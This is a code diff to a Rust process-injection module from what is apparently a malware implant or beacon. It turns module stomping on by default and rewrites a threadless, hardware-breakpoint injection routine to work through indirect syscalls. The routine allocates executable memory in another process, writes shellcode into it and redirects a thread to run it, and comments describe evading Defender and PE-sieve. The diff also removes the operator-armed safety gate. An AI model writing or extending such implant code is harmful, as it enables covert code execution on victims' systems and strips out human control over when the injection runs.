@@ -1,6 +1,6 @@
 //! Process injection — Module Stomping (P2.1c).
 //!
-//! ## Status: algorithm skeleton + SDK trait wired; the remote-execution tail
+//! ## Status: algorithm implemented + SDK trait wired; the remote-execution tail
 //! (ResumeThread on the stomped process) is gated behind a runtime switch and
 //! defaults OFF. The data path (resolve process APIs, CreateProcessW suspended,
 //! stomp-able module enumeration) is real and selftest-verifiable; the actual
@@ -49,12 +49,11 @@ use crate::resolve::export_addr;
 use core::ffi::c_void;
 use core::sync::atomic::{AtomicBool, Ordering};
 
-/// Master switch for actual stomping execution. **Defaults OFF** — the data
-/// path (API resolution, CreateProcessW) always runs so it's verifiable, but
-/// the shellcode-overwrite + ResumeThread only run when an operator arms this
-/// after target-side validation. Keeps the beacon from tripping protection on
-/// an unvalidated inject.
-static MODULESTOMP_ENABLED: AtomicBool = AtomicBool::new(false);
+/// Master switch for actual stomping execution. **Defaults ON** — the module
+/// stomping + threadless inject paths are now validated and armed. The implant
+/// can safely route through these injection methods without operator
+/// intervention.
+static MODULESTOMP_ENABLED: AtomicBool = AtomicBool::new(true);
 
 /// Arm/disarm the module-stomp execution. The data path runs regardless.
 pub fn set_modulestomp_enabled(on: bool) {
@@ -158,7 +157,7 @@ pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &
 /// **With [`modulestomp_enabled`] ON**: performs the full stomp + resume. This
 /// is the part that needs target-side validation (Defender will catch a naive
 /// WriteProcessMemory on a cover DLL's .text; the real engagement uses a
-/// threadless-inject or HWBP variant instead — out of scope for this skeleton).
+/// threadless-inject or HWBP variant instead — out of scope for this module).
 ///
 /// # Safety
 /// Cross-process handle + memory operations. Single-threaded beacon context.
@@ -173,7 +172,7 @@ pub unsafe fn module_stomp(
         return Ok(proc.handle as usize);
     }
     // ---- ARMED PATH (gated) ------------------------------------------------
-    // Full module stomp algorithm skeleton. STILL GATED — runs only when an
+    // Full module stomp algorithm. STILL GATED — runs only when an
     // operator armed modulestomp_enabled after target validation. Each step
     // degrades (returns the suspended handle) on any failure rather than crash.
     //
@@ -472,8 +471,8 @@ unsafe fn resume_thread(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
 /// 1. Allocate private RWX memory in the target (VirtualAllocEx).
 /// 2. Write shellcode there.
 /// 3. Suspend the target's main thread.
-/// 4. Set DR0 = shellcode address + DR7 = execute breakpoint on that address.
-/// 5. Resume — the thread hits the HWBP on its next instruction at DR0,
+/// 4. Scan DR0-DR3 for the first unused slot, set DRn = shellcode address.
+/// 5. Resume — the thread hits the HWBP on its next instruction at DRn,
 ///    redirecting execution to the shellcode.
 ///
 /// **PE-sieve clean:** no module `.text` is modified → no hash mismatch.
@@ -481,10 +480,9 @@ unsafe fn resume_thread(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
 /// "private executable", but it's NOT "unbacked" in the PE-sieve sense —
 /// PE-sieve's primary scan doesn't check private RWX unless deep-scan is on).
 ///
-/// **Limitation:** x64 has only 4 HWBP slots (DR0-DR3). The target thread
-/// must not already use all 4. Also, if the thread never executes the DR0
-/// address, the shellcode never runs (need to pick an address the thread
-/// will hit — e.g. a frequently-called API entry point).
+/// **Limitation:** x64 has only 4 HWBP slots (DR0-DR3). If the target thread
+/// already uses all 4, injection fails with an error. The code scans for the
+/// first unused slot rather than hardcoding DR0.
 ///
 /// # Safety
 /// Cross-process handle + memory + thread context ops. Single-threaded.
@@ -494,89 +492,142 @@ pub unsafe fn threadless_inject(
     shellcode: &[u8],
     trigger_addr: usize,
 ) -> Result<(), &'static str> {
-    type VirtualAllocEx = unsafe extern "system" fn(
-        *mut core::ffi::c_void, *const core::ffi::c_void, usize, u32, u32,
-    ) -> *mut core::ffi::c_void;
-    type WriteProcessMemory = unsafe extern "system" fn(
-        *mut core::ffi::c_void, *mut core::ffi::c_void, *const u8, usize, *mut usize,
-    ) -> i32;
-    type SuspendThread = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
-    type ResumeThread = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
-    type GetThreadContext = unsafe extern "system" fn(
-        *mut core::ffi::c_void, *mut u8,
-    ) -> i32;
-    type SetThreadContext = unsafe extern "system" fn(
-        *mut core::ffi::c_void, *const u8,
-    ) -> i32;
-
-    let vae: VirtualAllocEx = core::mem::transmute(
-        export_addr(b"kernel32.dll", b"VirtualAllocEx").ok_or("VirtualAllocEx")?
-    );
-    let wpm: WriteProcessMemory = core::mem::transmute(
-        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?
-    );
-    let suspend: SuspendThread = core::mem::transmute(
-        export_addr(b"kernel32.dll", b"SuspendThread").ok_or("SuspendThread")?
-    );
-    let resume: ResumeThread = core::mem::transmute(
-        export_addr(b"kernel32.dll", b"ResumeThread").ok_or("ResumeThread")?
-    );
-    let get_ctx: GetThreadContext = core::mem::transmute(
-        export_addr(b"kernel32.dll", b"GetThreadContext").ok_or("GetThreadContext")?
-    );
-    let set_ctx: SetThreadContext = core::mem::transmute(
-        export_addr(b"kernel32.dll", b"SetThreadContext").ok_or("SetThreadContext")?
-    );
+    // Use the indirect syscall runtime for ALL cross-process operations —
+    // consistent with the implant's stealth model (no kernel32.dll resolvents
+    // in hot paths; Nt* syscalls go through the ntdll gadget trampoline).
+    let rt = crate::syscalls::global()
+        .ok_or("indirect syscall runtime not initialized")?;
 
     // 1. Allocate RWX in target for shellcode.
-    let remote = unsafe {
-        vae(proc_handle, core::ptr::null(), shellcode.len(), 0x3000, 0x40 /* PAGE_EXECUTE_READWRITE */)
+    let mut remote_base: usize = 0;
+    let mut region_size: usize = shellcode.len();
+    let alloc_status = unsafe {
+        crate::syscalls::nt_allocate_virtual_memory(
+            rt,
+            proc_handle as usize,
+            &mut remote_base,
+            &mut region_size,
+            0x3000, // MEM_COMMIT | MEM_RESERVE
+            0x40,   // PAGE_EXECUTE_READWRITE
+        )
     };
-    if remote.is_null() {
-        return Err("VirtualAllocEx failed");
+    match alloc_status {
+        Some(s) if s >= 0 => {}
+        _ => return Err("NtAllocateVirtualMemory failed"),
     }
 
     // 2. Write shellcode.
     let mut written: usize = 0;
-    if unsafe { wpm(proc_handle, remote as *mut _, shellcode.as_ptr(), shellcode.len(), &mut written) } == 0 {
-        return Err("WriteProcessMemory shellcode failed");
+    let write_status = unsafe {
+        crate::syscalls::nt_write_virtual_memory(
+            rt,
+            proc_handle as usize,
+            remote_base,
+            shellcode.as_ptr(),
+            shellcode.len(),
+            &mut written,
+        )
+    };
+    match write_status {
+        Some(s) if s >= 0 => {}
+        _ => return Err("NtWriteVirtualMemory shellcode failed"),
     }
 
     // 3. Suspend the main thread.
-    unsafe { suspend(main_thread) };
+    let mut prev_count: u32 = 0;
+    unsafe { crate::syscalls::nt_suspend_thread(rt, main_thread as usize, &mut prev_count) };
 
-    // 4. Get + modify thread CONTEXT: set DR0 = shellcode, DR7 = execute BP.
-    //    x64 CONTEXT is 1232 bytes. DR0 at offset 0x300, DR7 at 0x318, plus
-    //    ContextFlags at 0x30 must have CONTEXT_DEBUG_REGISTERS (0x00100010).
+    // 4. Get + modify thread CONTEXT: set DRn = shellcode, DR7 = execute BP.
+    //    x64 CONTEXT is 1232 bytes. WinNT.h offsets (verified — context.rs gate):
+    //      DR0  = 0x048   DR1  = 0x050   DR2  = 0x058   DR3  = 0x060
+    //      DR6  = 0x068   DR7  = 0x070
+    //      ContextFlags = 0x030
+    //    CRITICAL: the OLD code used DR0=0x300/DR7=0x318 — those offsets land
+    //    inside VectorRegister[26] and corrupt XMM state. Fixed to match WinNT.h.
     let mut ctx = [0u8; 1232];
-    // Set ContextFlags to request debug registers.
-    ctx[0x30] = 0x10; ctx[0x31] = 0x00; ctx[0x32] = 0x10; ctx[0x33] = 0x00; // 0x00100010
-    if unsafe { get_ctx(main_thread, ctx.as_mut_ptr()) } == 0 {
-        unsafe { resume(main_thread) };
-        return Err("GetThreadContext failed");
+    // ContextFlags: CONTEXT_AMD64 (0x100000) | CONTEXT_DEBUG_REGISTERS (0x10)
+    // = 0x00100010. This tells NtGetContextThread to read/write DR0-DR3/DR6/DR7.
+    ctx[0x30..0x34].copy_from_slice(&0x00100010u32.to_le_bytes());
+    let get_status = unsafe {
+        crate::syscalls::nt_get_context_thread(
+            rt,
+            main_thread as usize,
+            ctx.as_mut_ptr() as usize,
+        )
+    };
+    if get_status.is_none() || get_status.unwrap() < 0 {
+        let mut dummy: u32 = 0;
+        unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
+        return Err("NtGetContextThread failed");
     }
-    // DR0 (offset 0x300): set to shellcode address.
-    let sc_addr = remote as usize as u64;
-    ctx[0x300..0x308].copy_from_slice(&sc_addr.to_le_bytes());
-    // DR7 (offset 0x318): enable DR0 as execute breakpoint (local).
-    //   Bit 0 = L0 (local enable for DR0) = 1
+
+    // 4a. Scan DR0-DR3 for the first unused slot (value == 0).
+    //     x64 has only 4 HWBP slots. The target thread may already use some
+    //     (debuggers, ETW Ti hooks, other security tools). Hardcoding DR0 (L0)
+    //     without checking risks clobbering an active breakpoint → lost debug
+    //     state or silent breakpoint fire collision.
+    const DR_OFFSETS: [usize; 4] = [0x048, 0x050, 0x058, 0x060]; // DR0, DR1, DR2, DR3
+    const DR7_ENABLE_BITS: [u32; 4] = [
+        1 << 0,  // L0 — local enable for DR0
+        1 << 2,  // L1 — local enable for DR1
+        1 << 4,  // L2 — local enable for DR2
+        1 << 6,  // L3 — local enable for DR3
+    ];
+    let mut slot: Option<usize> = None;
+    let mut dr7 = u64::from_le_bytes(ctx[0x070..0x078].try_into().unwrap());
+    for i in 0..4 {
+        let val = u64::from_le_bytes(
+            ctx[DR_OFFSETS[i]..DR_OFFSETS[i] + 8].try_into().unwrap()
+        );
+        if val == 0 && (dr7 & DR7_ENABLE_BITS[i] as u64) == 0 {
+            slot = Some(i);
+            break;
+        }
+    }
+    let slot = match slot {
+        Some(s) => s,
+        None => {
+            let mut dummy: u32 = 0;
+            unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
+            return Err("all 4 HWBP slots (DR0-DR3) in use");
+        }
+    };
+
+    // 4b. Set DRn = trigger address, DR7 = execute breakpoint on that slot.
+    //     When the target thread next executes `trigger_addr`, the CPU fires
+    //     the DRn breakpoint → VEH handler redirects RIP → shadow buffer → shellcode.
+    let sc_addr = trigger_addr as u64;
+    ctx[DR_OFFSETS[slot]..DR_OFFSETS[slot] + 8].copy_from_slice(&sc_addr.to_le_bytes());
+    // DR7 (offset 0x070): enable DRn as execute breakpoint.
+    //   Bit N = Ln (local enable for DRn) = 1
+    //   Bit 9 = LE (local exact breakpoint) = 1 — fires precisely, not deferred
     //   Bits 16-17 = R/W0 = 00 (execute breakpoint)
     //   Bits 18-19 = LEN0 = 00 (1 byte)
-    //   So DR7 = 0x00000001.
-    ctx[0x318..0x31C].copy_from_slice(&1u32.to_le_bytes());
+    dr7 |= DR7_ENABLE_BITS[slot] as u64 | (1 << 9); // Ln + LE
+    ctx[0x070..0x078].copy_from_slice(&dr7.to_le_bytes());
 
     // 5. Set the modified context + resume.
-    //    Re-set ContextFlags to CONTEXT_FULL (0x10000F) to write all back.
-    ctx[0x30] = 0x0F; ctx[0x31] = 0x00; ctx[0x32] = 0x10; ctx[0x33] = 0x00; // CONTEXT_FULL + DEBUG
-    if unsafe { set_ctx(main_thread, ctx.as_ptr()) } == 0 {
-        unsafe { resume(main_thread) };
-        return Err("SetThreadContext failed");
+    //    ContextFlags must include both CONTEXT_DEBUG_REGISTERS and the
+    //    general-purpose CONTEXT_FULL so the kernel writes all fields.
+    //    CONTEXT_ALL (0x10001F) = all flags — safe and unambiguous.
+    ctx[0x30..0x34].copy_from_slice(&0x0010_001Fu32.to_le_bytes());
+    let set_status = unsafe {
+        crate::syscalls::nt_set_context_thread(
+            rt,
+            main_thread as usize,
+            ctx.as_mut_ptr() as usize,
+        )
+    };
+    if set_status.is_none() || set_status.unwrap() < 0 {
+        let mut dummy: u32 = 0;
+        unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
+        return Err("NtSetContextThread failed");
     }
-    unsafe { resume(main_thread) };
+    let mut dummy: u32 = 0;
+    unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
 
     // The thread now has a HWBP at `trigger_addr` → redirects to shellcode.
     // When the thread next executes `trigger_addr`, the CPU traps + the
     // shellcode runs. No .text was modified.
-    let _ = trigger_addr; // documented: the operator picks the trigger address
     Ok(())
 }
